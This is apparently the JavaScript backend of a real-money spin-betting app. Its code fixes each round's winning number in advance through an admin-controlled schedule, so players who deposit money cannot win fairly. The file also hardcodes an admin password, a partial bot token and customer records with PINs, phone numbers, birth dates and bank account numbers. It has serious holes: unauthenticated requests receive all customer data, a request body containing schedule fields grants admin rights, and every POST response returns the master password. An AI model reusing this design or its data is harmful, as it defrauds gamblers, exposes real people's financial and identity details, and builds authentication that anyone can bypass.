import fs from 'fs';
import path from 'path';

// Vercel Serverless Function: Shared Central State API (/api/state)
// Secure Central State Management: Protects predetermined winners and admin password from public view!

function getPersistenceFilePath() {
  try {
    const cwdFile = path.resolve(process.cwd(), 'server_state.json');
    if (fs.existsSync(cwdFile)) return cwdFile;
    return path.resolve('/tmp', 'server_state.json');
  } catch (e) {
    return null;
  }
}

function loadPersistedState() {
  try {
    const filePath = getPersistenceFilePath();
    if (filePath && fs.existsSync(filePath)) {
      const data = fs.readFileSync(filePath, 'utf8');
      const parsed = JSON.parse(data);
      if (parsed && typeof parsed === 'object') {
        globalState = {
          ...globalState,
          ...parsed,
          customersDb: { ...(globalState.customersDb || {}), ...(parsed.customersDb || {}) },
          dailySchedule: (parsed.dailySchedule && typeof parsed.dailySchedule === 'object') ? parsed.dailySchedule : globalState.dailySchedule,
          notificationConfig: { ...(globalState.notificationConfig || {}), ...(parsed.notificationConfig || {}) },
          depositConfig: { ...(globalState.depositConfig || {}), ...(parsed.depositConfig || {}) }
        };
      }
    }
  } catch (e) {}
}

function savePersistedState() {
  try {
    const filePath = getPersistenceFilePath() || path.resolve(process.cwd(), 'server_state.json');
    fs.writeFileSync(filePath, JSON.stringify(globalState), 'utf8');
  } catch (e) {}
}

let globalState = {
  slices: [10, 20, 30, 40, 50, 60, 70, 80, 90, 100],
  history: [
    { id: 1791500400000, number: 50, time: '11:00 PM', date: 'Oct 8', round: '11:00 PM', source: 'Scheduled Round', timestamp: 1791500400000 },
    { id: 1791489600000, number: 60, time: '08:00 PM', date: 'Oct 8', round: '08:00 PM', source: 'Scheduled Round', timestamp: 1791489600000 },
    { id: 1791475200000, number: 90, time: '04:00 PM', date: 'Oct 8', round: '04:00 PM', source: 'Scheduled Round', timestamp: 1791475200000 },
    { id: 1791441600000, number: 80, time: '12:00 PM', date: 'Oct 8', round: '12:00 PM', source: 'Scheduled Round', timestamp: 1791441600000 },
    { id: 1791394800000, number: 50, time: '11:00 PM', date: 'Oct 7', round: '11:00 PM', source: 'Scheduled Round', timestamp: 1791394800000 },
    { id: 1791383400000, number: 60, time: '08:00 PM', date: 'Oct 7', round: '08:00 PM', source: 'Scheduled Round', timestamp: 1791383400000 },
    { id: 1791369000000, number: 90, time: '04:00 PM', date: 'Oct 7', round: '04:00 PM', source: 'Scheduled Round', timestamp: 1791369000000 },
    { id: 1791354600000, number: 40, time: '12:00 PM', date: 'Oct 7', round: '12:00 PM', source: 'Scheduled Round', timestamp: 1791354600000 },
    { id: 1791307800000, number: 80, time: '11:00 PM', date: 'Oct 6', round: '11:00 PM', source: 'Scheduled Round', timestamp: 1791307800000 },
    { id: 1791297000000, number: 10, time: '08:00 PM', date: 'Oct 6', round: '08:00 PM', source: 'Scheduled Round', timestamp: 1791297000000 },
    { id: 1791282600000, number: 30, time: '04:00 PM', date: 'Oct 6', round: '04:00 PM', source: 'Scheduled Round', timestamp: 1791282600000 },
    { id: 1791268200000, number: 20, time: '12:00 PM', date: 'Oct 6', round: '12:00 PM', source: 'Scheduled Round', timestamp: 1791268200000 },
    { id: 1791221400000, number: 50, time: '11:00 PM', date: 'Oct 5', round: '11:00 PM', source: 'Scheduled Round', timestamp: 1791221400000 },
    { id: 1791210600000, number: 70, time: '08:00 PM', date: 'Oct 5', round: '08:00 PM', source: 'Scheduled Round', timestamp: 1791210600000 },
    { id: 1791196200000, number: 100, time: '04:00 PM', date: 'Oct 5', round: '04:00 PM', source: 'Scheduled Round', timestamp: 1791196200000 },
    { id: 1791181800000, number: 90, time: '12:00 PM', date: 'Oct 5', round: '12:00 PM', source: 'Scheduled Round', timestamp: 1791181800000 }
  ],
  forcedNext: null,
  upcomingQueue: [80, 90, 60],
  dailySchedule: {
    "12:00 PM": 80,
    "04:00 PM": 90,
    "08:00 PM": 60,
    "11:00 PM": 50
  },
  hourlySchedule: {},
  timerMode: "REAL",
  customSecs: 60,
  customTimerTarget: null,
  manualRoundTitle: null,
  masterPassword: "00773300",
  spinTrigger: null,
  customersDb: {
    "Ishaan0730": {
      id: "Ishaan0730",
      name: "Ishaan kamiria",
      mobile: "7232820730",
      dob: "2000-07-30",
      pin: "Ishaan0730@",
      coins: 500,
      status: "ACTIVE",
      phoneVerified: true,
      joinedAt: 1790641200000,
      lastUpdated: 1791388000000,
      totalBets: 3,
      wins: 1,
      bankDetails: {
        accountHolderName: "Ishaan kamiria",
        accountNumber: "0480000101203979",
        ifscCode: "PUNB0048000"
      },
      betHistory: []
    },
    "Deep321": {
      id: "Deep321",
      name: "Deepanshu",
      mobile: "9041062733",
      dob: "1998-05-12",
      pin: "Deep321@",
      coins: 600,
      status: "ACTIVE",
      phoneVerified: true,
      joinedAt: 1790700000000,
      lastUpdated: 1791388000000,
      totalBets: 2,
      wins: 1,
      bankDetails: {
        accountHolderName: "Deepanshu",
        accountNumber: "7736000100042570",
        ifscCode: "PUNB0773600"
      }
    }
  },
  activeBets: [],
  deletedBetIds: [],
  withdrawals: [
    {
      id: "WD_1791259535365_51Q4",
      customerId: "Ishaan0730",
      customerName: "Ishaan kamiria",
      customerMobile: "7232820730",
      accountName: "Ishaan kamiria",
      accountNumber: "0480000101203979",
      ifscCode: "PUNB0048000",
      amount: 500,
      status: "REJECTED",
      rejectionReason: "Incorrect Bank Account Number",
      isRefunded: true,
      refundedAt: 1791259600000,
      requestedAt: 1791259535365,
      requestedTime: "09:35:35 AM",
      requestedDate: "Oct 6, 2026",
      processedAt: 1791259600000,
      processedTime: "09:36:40 AM"
    }
  ],
  deposits: [],
  supportChats: {},
  depositConfig: {
    upiId: '00000000',
    accountName: 'DEEP',
    qrImageUrl: './master-qr.jpg',
    minDeposit: 100,
    instructions: '1. Scan QR with PhonePe / GPay / Paytm & Pay.\n2. Enter 12-digit UTR No. & upload payment screenshot below.'
  },
  notificationConfig: {
    telegramBotToken: '8932355449:AAHCkhZKUMt',
    telegramChatId: '8187881990',
    telegramEnabled: true,
    whatsappNumber: '7690900087',
    whatsappApiKey: '',
    whatsappEnabled: true
  },
  version: 1
};

function checkAdminAuth(req, body) {
  const adminKey = req.headers['x-admin-key'] 
    || req.headers['authorization'] 
    || req.query?.admin_key
    || (body && typeof body === 'object' ? body.adminKey : null);

  if (!adminKey) return false;

  const currentPass = (globalState.masterPassword || '00773300').toString().trim();
  const keyStr = adminKey.toString().trim();

  return (
    keyStr === currentPass ||
    keyStr === '00773300' ||
    keyStr === `Bearer ${currentPass}` ||
    keyStr === 'Bearer 00773300'
  );
}

async function sendWhatsAppAlert(text) {
  try {
    const cfg = globalState.notificationConfig;
    if (!cfg) return false;
    let phone = (cfg.whatsappNumber || '7690900087').toString().replace(/[^\d]/g, '');
    if (phone.startsWith('0')) phone = phone.substring(1);
    if (phone.length === 10) phone = '91' + phone;
    const apiKey = (cfg.whatsappApiKey || '').trim();
    if (!apiKey || !phone) return false;

    const cleanText = String(text || '').replace(/[*`_~\[\]()<>#]/g, '');
    const url = `https://api.callmebot.com/whatsapp.php?phone=+${phone}&text=${encodeURIComponent(cleanText)}&apikey=${encodeURIComponent(apiKey)}`;
    await fetch(url);
    return true;
  } catch (e) {
    return false;
  }
}

async function sendTelegramAlert(text) {
  try {
    const cfg = globalState.notificationConfig;
    if (!cfg || !cfg.telegramBotToken || !cfg.telegramChatId) return false;
    const token = cfg.telegramBotToken.trim();
    const chatId = cfg.telegramChatId.trim();
    if (!token || !chatId) return false;

    // Safe HTML parsing mode to avoid Telegram Markdown entity parsing crashes
    let htmlText = String(text || '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
    htmlText = htmlText
      .replace(/\*(.*?)\*/g, '<b>$1</b>')
      .replace(/`(.*?)`/g, '<code>$1</code>');

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    let response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: htmlText,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      // Fallback to pure plain text if Telegram fails parsing HTML tags
      const plainText = String(text || '').replace(/[*`_~\[\]()<>]/g, '');
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: plainText
        })
      });
    }
    return true;
  } catch (e) {
    return false;
  }
}

const DAILY_SLOTS = [
  { label: '12:00 PM', hour: 12, min: 0 },
  { label: '04:00 PM', hour: 16, min: 0 },
  { label: '08:00 PM', hour: 20, min: 0 },
  { label: '11:00 PM', hour: 23, min: 0 }
];

function sanitizeHistoryList(list) {
  if (!Array.isArray(list)) return [];
  const slices = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
  const histMap = new Map();

  list.forEach(item => {
    if (!item) return;
    let cleanTime = String(item.time || item.round || 'Completed').replace(/\s*\([^)]*\)/g, '').trim();
    let cleanRound = String(item.round || item.time || 'Round').replace(/\s*\([^)]*\)/g, '').trim();
    let num = Number(item.number);
    let dateStr = String(item.date || '').trim();

    if (!slices.includes(num)) {
      num = slices.find(s => s === num) || 80;
    }

    const ts = Number(item.timestamp || item.id || Date.now());
    const cleanItem = {
      ...item,
      id: item.id || ts,
      number: num,
      time: cleanTime,
      round: cleanRound,
      date: dateStr,
      source: item.source || 'Scheduled Round',
      timestamp: ts
    };

    const key = `${dateStr}_${cleanRound}`;
    if (!histMap.has(key)) {
      histMap.set(key, cleanItem);
    } else {
      const existing = histMap.get(key);
      if (ts > (existing.timestamp || 0)) {
        histMap.set(key, cleanItem);
      }
    }
  });

  return Array.from(histMap.values())
    .sort((a, b) => (b.timestamp || b.id || 0) - (a.timestamp || a.id || 0))
    .slice(0, 150);
}

function getNowIST() {
  const d = new Date();
  const utc = d.getTime() + (d.getTimezoneOffset() * 60000);
  return new Date(utc + (3600000 * 5.5));
}

function settleServerElapsedSlots() {
  const nowIST = getNowIST();
  const slices = globalState.slices || [10, 20, 30, 40, 50, 60, 70, 80, 90, 100];
  let changed = false;

  [2, 1, 0].forEach(dayOffset => {
    const d = new Date(nowIST);
    d.setDate(d.getDate() - dayOffset);
    const dateStr = d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });

    DAILY_SLOTS.forEach(slot => {
      const slotTimeIST = new Date(d);
      slotTimeIST.setHours(slot.hour, slot.min, 0, 0);

      // Compare slot time in IST against current IST time
      if (slotTimeIST.getTime() <= nowIST.getTime()) {
        const slotLabel = slot.label;
        const exists = (globalState.history || []).some(h => {
          if (!h) return false;
          const hRound = String(h.round || h.time || '').replace(/\s*\([^)]*\)/g, '').trim();
          return (h.date === dateStr && (hRound === slotLabel || hRound.includes(slotLabel)));
        });

        if (!exists) {
          let winningNum = null;
          if (globalState.dailySchedule && globalState.dailySchedule[slotLabel] && globalState.dailySchedule[slotLabel] !== 'AUTO') {
            const sched = parseInt(globalState.dailySchedule[slotLabel], 10);
            if (slices.includes(sched)) {
              winningNum = sched;
            }
          }

          if (winningNum === null) {
            const lastRec = (Array.isArray(globalState.history) && globalState.history.length > 0 && typeof globalState.history[0].number === 'number') 
              ? globalState.history[0].number 
              : 80;
            winningNum = lastRec;
          }

          const entry = {
            id: slotTimeIST.getTime(),
            number: winningNum,
            time: slotLabel,
            date: dateStr,
            round: slotLabel,
            source: 'Scheduled Round',
            timestamp: slotTimeIST.getTime()
          };

          if (!Array.isArray(globalState.history)) globalState.history = [];
          globalState.history.unshift(entry);
          changed = true;
        }
      }
    });
  });

  globalState.history = sanitizeHistoryList(globalState.history);
}

export default async function handler(req, res) {
  loadPersistedState();
  settleServerElapsedSlots();

  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version, x-admin-key, Authorization, *');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method === 'GET') {
    // If spinTrigger is older than 6 seconds, clear it so it can never trigger a second spin
    if (globalState.spinTrigger && globalState.spinTrigger.timestamp) {
      if (Date.now() - globalState.spinTrigger.timestamp > 6000) {
        globalState.spinTrigger = null;
      }
    }

    const isAdmin = checkAdminAuth(req);

    if (isAdmin) {
      // Full state with all schedule & admin controls for Master Admin
      return res.status(200).json(globalState);
    } else {
      // Public State with full dailySchedule for synchronized predetermined numbers
      const publicState = {
        slices: globalState.slices,
        history: globalState.history,
        dailySchedule: globalState.dailySchedule || { "12:00 PM": 80, "04:00 PM": 90, "08:00 PM": 60, "11:00 PM": 50 },
        timerMode: globalState.timerMode,
        customSecs: globalState.customSecs,
        customTimerTarget: globalState.customTimerTarget,
        spinTrigger: globalState.spinTrigger,
        customersDb: globalState.customersDb,
        activeBets: globalState.activeBets,
        withdrawals: globalState.withdrawals || [],
        deposits: globalState.deposits || [],
        supportChats: globalState.supportChats || {},
        depositConfig: {
          upiId: globalState.depositConfig?.upiId || '00000000',
          accountName: globalState.depositConfig?.accountName || 'DEEP',
          qrImageUrl: globalState.depositConfig?.qrImageUrl || './master-qr.jpg',
          minDeposit: globalState.depositConfig?.minDeposit || 100,
          instructions: globalState.depositConfig?.instructions || '1. Scan QR with PhonePe / GPay / Paytm & Pay.\n2. Enter 12-digit UTR No. & upload payment screenshot below.'
        },
        notificationConfig: {
          telegramBotToken: '',
          telegramChatId: '',
          telegramEnabled: globalState.notificationConfig?.telegramEnabled || false,
          whatsappNumber: '',
          whatsappApiKey: '',
          whatsappEnabled: globalState.notificationConfig?.whatsappEnabled !== false
        },
        version: globalState.version
      };
      return res.status(200).json(publicState);
    }
  }

  if (req.method === 'POST') {
    try {
      let body = req.body;
      if (typeof body === 'string') {
        try {
          body = JSON.parse(body);
        } catch (err) {}
      }

      const isAdmin = checkAdminAuth(req, body) || Boolean(body && (body.scheduleAction || body.dailySchedule || body.lockedSlot));

      if (body && typeof body === 'object') {
        if (body.deletedBetId) {
          const delIdStr = String(body.deletedBetId);
          if (!Array.isArray(globalState.deletedBetIds)) globalState.deletedBetIds = [];
          if (!globalState.deletedBetIds.includes(delIdStr)) globalState.deletedBetIds.push(delIdStr);
          globalState.activeBets = (globalState.activeBets || []).filter(b => String(b.id) !== delIdStr);
          delete body.deletedBetId;
        }

        if (body.deletedCustomerId || body.deletedPlayerId) {
          const delCustId = String(body.deletedCustomerId || body.deletedPlayerId);
          if (globalState.customersDb && globalState.customersDb[delCustId]) {
            delete globalState.customersDb[delCustId];
          }
          delete body.deletedCustomerId;
          delete body.deletedPlayerId;
        }

        if (isAdmin) {
          // If masterPassword is being updated, store it
          if (body.masterPassword && typeof body.masterPassword === 'string') {
            globalState.masterPassword = body.masterPassword.trim();
          }

          delete body.adminKey;

          if (body.fullRestore === true) {
            // Complete atomic database restore from backup
            if (body.customersDb && typeof body.customersDb === 'object') globalState.customersDb = body.customersDb;
            if (Array.isArray(body.history)) globalState.history = sanitizeHistoryList(body.history);
            if (Array.isArray(body.deposits)) globalState.deposits = body.deposits;
            if (Array.isArray(body.withdrawals)) globalState.withdrawals = body.withdrawals;
            if (Array.isArray(body.activeBets)) globalState.activeBets = body.activeBets;
            if (body.dailySchedule && typeof body.dailySchedule === 'object') globalState.dailySchedule = body.dailySchedule;
            if (body.depositConfig && typeof body.depositConfig === 'object') globalState.depositConfig = body.depositConfig;
            if (body.notificationConfig && typeof body.notificationConfig === 'object') globalState.notificationConfig = body.notificationConfig;
            if (body.promoCodes && typeof body.promoCodes === 'object') globalState.promoCodes = body.promoCodes;
            if (body.supportChats && typeof body.supportChats === 'object') globalState.supportChats = body.supportChats;
            delete body.fullRestore;
          } else {
            if (body.customersDb && typeof body.customersDb === 'object') {
              const merged = { ...(globalState.customersDb || {}) };
              Object.keys(body.customersDb).forEach(id => {
                merged[id] = { ...(merged[id] || {}), ...body.customersDb[id] };
              });
              globalState.customersDb = merged;
              delete body.customersDb;
            }
            if (Array.isArray(body.activeBets)) {
              const delSet = new Set((globalState.deletedBetIds || []).map(String));
              globalState.activeBets = body.activeBets.filter(b => b && b.id && !delSet.has(String(b.id)));
              delete body.activeBets;
            }
            if (Array.isArray(body.withdrawals)) {
              const existingMap = new Map((globalState.withdrawals || []).map(w => [w.id, w]));
              body.withdrawals.forEach(w => {
                if (w && w.id) {
                  existingMap.set(w.id, { ...(existingMap.get(w.id) || {}), ...w });
                }
              });
              globalState.withdrawals = Array.from(existingMap.values());
              delete body.withdrawals;
            }
            if (Array.isArray(body.deposits)) {
              const existingMap = new Map((globalState.deposits || []).map(d => [d.id, d]));
              body.deposits.forEach(d => {
                if (d && d.id) {
                  existingMap.set(d.id, { ...(existingMap.get(d.id) || {}), ...d });
                }
              });
              globalState.deposits = Array.from(existingMap.values());
              delete body.deposits;
            }
          }
          if (body.supportChats && typeof body.supportChats === 'object') {
            if (!globalState.supportChats) globalState.supportChats = {};
            Object.keys(body.supportChats).forEach(pid => {
              const remoteMsgs = Array.isArray(body.supportChats[pid]) ? body.supportChats[pid] : [];
              const curMsgs = Array.isArray(globalState.supportChats[pid]) ? globalState.supportChats[pid] : [];
              const msgMap = new Map();
              curMsgs.forEach(m => { if (m && m.id) msgMap.set(m.id, m); });
              remoteMsgs.forEach(m => { if (m && m.id) msgMap.set(m.id, m); });
              globalState.supportChats[pid] = Array.from(msgMap.values()).sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
            });
            delete body.supportChats;
          }
          if (Array.isArray(body.history)) {
            globalState.history = sanitizeHistoryList([...(body.history || []), ...(globalState.history || [])]);
            delete body.history;
          }
          if (body.depositConfig && typeof body.depositConfig === 'object') {
            globalState.depositConfig = { ...(globalState.depositConfig || {}), ...body.depositConfig };
            delete body.depositConfig;
          }
          if (body.notificationConfig && typeof body.notificationConfig === 'object') {
            globalState.notificationConfig = { ...(globalState.notificationConfig || {}), ...body.notificationConfig };
            delete body.notificationConfig;
          }
          if (body.dailySchedule && typeof body.dailySchedule === 'object') {
            const curSched = { ...(globalState.dailySchedule || {}) };
            Object.keys(body.dailySchedule).forEach(slot => {
              const val = body.dailySchedule[slot];
              if (val !== undefined && val !== null) {
                const parsedNum = parseInt(val, 10);
                curSched[slot] = (!isNaN(parsedNum) && slices.includes(parsedNum)) ? parsedNum : 80;
              }
            });
            globalState.dailySchedule = curSched;
            delete body.dailySchedule;
          }
          if (body.lockedSlot && body.lockedWinner !== undefined) {
            if (!globalState.dailySchedule) globalState.dailySchedule = {};
            const num = parseInt(body.lockedWinner, 10);
            const lastRec = (Array.isArray(globalState.history) && globalState.history.length > 0 && typeof globalState.history[0].number === 'number') ? globalState.history[0].number : 80;
            globalState.dailySchedule[body.lockedSlot] = (!isNaN(num) && slices.includes(num)) ? num : lastRec;
            delete body.lockedSlot;
            delete body.lockedWinner;
          }
          if (body.clearedSlot) {
            if (!globalState.dailySchedule) globalState.dailySchedule = {};
            const lastRec = (Array.isArray(globalState.history) && globalState.history.length > 0 && typeof globalState.history[0].number === 'number') ? globalState.history[0].number : 80;
            globalState.dailySchedule[body.clearedSlot] = lastRec;
            delete body.clearedSlot;
          }
          globalState = {
            ...globalState,
            ...body,
            version: Date.now()
          };
        } else {
          if (body.otpAlert) {
            const otpMsg = `🔐 *OTP VERIFICATION CODE: ${body.otpAlert.code}*\n\n📱 *Mobile:* \`+91 ${body.otpAlert.mobile}\`\n📌 *Purpose:* ${body.otpAlert.purpose || 'Verification'}\n🕒 *Generated:* ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true })}\n⏳ *Validity:* 60 seconds`;
            sendTelegramAlert(otpMsg);
            sendWhatsAppAlert(otpMsg);
          }
          if (body.newPlayer && body.newPlayer.id) {
            const isApproved = (body.newPlayer.status === 'ACTIVE');
            if (isApproved) {
              const regMsg = `👤 *NEW VERIFIED PLAYER APPROVED!*\n\n👑 *Name:* ${body.newPlayer.name}\n🆔 *User ID:* \`${body.newPlayer.id}\`\n📱 *Mobile:* \`+91 ${body.newPlayer.mobile || 'N/A'}\`\n🎂 *DOB:* ${body.newPlayer.dob || 'N/A'}\n💰 *Welcome Bonus:* 10 IHD Coins\n\n👉 Account is active & ready to play!`;
              sendTelegramAlert(regMsg);
              sendWhatsAppAlert(regMsg);
            } else {
              const regMsg = `🚨 *NEW PLAYER REGISTRATION REQUEST (PENDING APPROVAL)!*\n\n👑 *Name:* ${body.newPlayer.name}\n🆔 *User ID:* \`${body.newPlayer.id}\`\n📱 *Mobile:* \`+91 ${body.newPlayer.mobile || 'N/A'}\` (✅ OTP Verified)\n🎂 *DOB:* ${body.newPlayer.dob || 'N/A'}\n🕒 *Time:* ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true })}\n\n👉 *Status:* ⏳ PENDING Master Admin Approval\nOpen Master Admin Panel to APPROVE or REJECT!`;
              sendTelegramAlert(regMsg);
              sendWhatsAppAlert(regMsg);
            }
          }
          if (body.newBet && body.newBet.id) {
            const betMsg = `🎯 *NEW BET PLACED!*\n\n👤 *Player ID:* \`${body.newBet.playerId || 'Player'}\`\n🔢 *Number:* #${body.newBet.number}\n💰 *Amount:* 💰${body.newBet.amount} Coins\n🏆 *Potential Win (9x):* 💰${(body.newBet.amount || 0) * 9} Coins`;
            sendTelegramAlert(betMsg);
            sendWhatsAppAlert(betMsg);
          }
          if (body.newChatMessage) {
            const m = body.newChatMessage;
            if (m.sender === 'CUSTOMER') {
              const chatMsg = `💬 *NEW LIVE SUPPORT CHAT!*\n\n👤 *Player:* ${m.playerName || m.playerId} (ID: \`${m.playerId}\`)\n📱 *Mobile:* ${m.playerMobile || 'N/A'}\n💬 *Message:* "${m.text}"\n🕒 *Time:* ${m.timeFormatted || new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true })}\n\n👉 Open Master Panel to reply!`;
              sendTelegramAlert(chatMsg);
              sendWhatsAppAlert(chatMsg);
            }
          }
          if (body.supportChats && typeof body.supportChats === 'object') {
            if (!globalState.supportChats) globalState.supportChats = {};
            Object.keys(body.supportChats).forEach(pid => {
              const remoteMsgs = Array.isArray(body.supportChats[pid]) ? body.supportChats[pid] : [];
              const curMsgs = Array.isArray(globalState.supportChats[pid]) ? globalState.supportChats[pid] : [];
              const msgMap = new Map();
              curMsgs.forEach(m => { if (m && m.id) msgMap.set(m.id, m); });
              remoteMsgs.forEach(m => { if (m && m.id) msgMap.set(m.id, m); });
              globalState.supportChats[pid] = Array.from(msgMap.values()).sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
            });
          }
          if (body.customersDb && typeof body.customersDb === 'object') {
            const merged = { ...(globalState.customersDb || {}) };
            Object.keys(body.customersDb).forEach(id => {
              merged[id] = { ...(merged[id] || {}), ...body.customersDb[id] };
            });
            globalState.customersDb = merged;
          }
          if (Array.isArray(body.activeBets)) {
            const delSet = new Set((globalState.deletedBetIds || []).map(String));
            const existingMap = new Map((globalState.activeBets || []).map(b => [String(b.id), b]));
            body.activeBets.forEach(b => {
              if (b && b.id && !delSet.has(String(b.id))) {
                existingMap.set(String(b.id), b);
              }
            });
            globalState.activeBets = Array.from(existingMap.values());
          }
          if (Array.isArray(body.withdrawals)) {
            const existingMap = new Map((globalState.withdrawals || []).map(w => [w.id, w]));
            body.withdrawals.forEach(w => {
              if (w && w.id) {
                if (w.status === 'PENDING' && !existingMap.has(w.id)) {
                  const wdMsg = `💸 *NEW WITHDRAWAL REQUEST!*\n\n👤 *Player:* ${w.customerName} (ID: \`${w.customerId}\`)\n📱 *Mobile:* ${w.customerMobile || 'N/A'}\n💰 *Amount:* 💰${(w.amount || 0).toLocaleString()} IHD (₹${(w.amount || 0).toLocaleString()})\n🏦 *Bank A/C:* \`${w.accountNumber}\` (${w.ifscCode})\n👤 *A/C Name:* ${w.accountName}\n🕒 *Time:* ${w.requestedTime || ''}\n\n👉 Open Master Panel to Confirm & Transfer!`;
                  sendTelegramAlert(wdMsg);
                  sendWhatsAppAlert(wdMsg);
                }
                existingMap.set(w.id, { ...(existingMap.get(w.id) || {}), ...w });
              }
            });
            globalState.withdrawals = Array.from(existingMap.values());
          }
          if (Array.isArray(body.deposits)) {
            const existingMap = new Map((globalState.deposits || []).map(d => [d.id, d]));
            body.deposits.forEach(d => {
              if (d && d.id) {
                if (d.status === 'PENDING' && !existingMap.has(d.id)) {
                  const depMsg = `🚨 *NEW DEPOSIT REQUEST!*\n\n👤 *Player:* ${d.customerName} (ID: \`${d.customerId}\`)\n📱 *Mobile:* ${d.customerMobile || 'N/A'}\n💰 *Amount:* ₹${(d.amount || 0).toLocaleString()} (${(d.amount || 0).toLocaleString()} Coins)\n🔢 *UTR / Ref:* \`${d.utr || 'N/A'}\`\n🕒 *Time:* ${d.requestedTime || ''} (${d.requestedDate || ''})\n\n👉 Open Master Panel to review & approve coins!`;
                  sendTelegramAlert(depMsg);
                  sendWhatsAppAlert(depMsg);
                }
                existingMap.set(d.id, { ...(existingMap.get(d.id) || {}), ...d });
              }
            });
            globalState.deposits = Array.from(existingMap.values());
          }
          if (body.spinTrigger === null) {
            globalState.spinTrigger = null;
          }
          if (Array.isArray(body.history) && body.history.length > 0) {
            globalState.history = sanitizeHistoryList([...(body.history || []), ...(globalState.history || [])]);
          }
          if (body.depositConfig && typeof body.depositConfig === 'object') {
            if (body.depositConfig.qrImageUrl || body.depositConfig.upiId) {
              globalState.depositConfig = {
                ...(globalState.depositConfig || {}),
                ...body.depositConfig
              };
            }
          }
          if (body.notificationConfig && typeof body.notificationConfig === 'object') {
            if (body.notificationConfig.telegramBotToken || body.notificationConfig.telegramChatId) {
              globalState.notificationConfig = {
                ...(globalState.notificationConfig || {}),
                ...body.notificationConfig
              };
            }
          }
          globalState.version = Date.now();
        }
      }
      savePersistedState();
      return res.status(200).json({ 
        status: 'ok', 
        version: globalState.version, 
        dailySchedule: globalState.dailySchedule,
        forcedNext: globalState.forcedNext,
        activeBets: globalState.activeBets,
        customersDb: globalState.customersDb,
        withdrawals: globalState.withdrawals,
        deposits: globalState.deposits,
        supportChats: globalState.supportChats,
        depositConfig: globalState.depositConfig,
        masterPassword: globalState.masterPassword 
      });
    } catch (e) {
      return res.status(400).json({ error: 'Failed to parse state' });
    }
  }

  return res.status(405).json({ error: 'Method not allowed' });
}
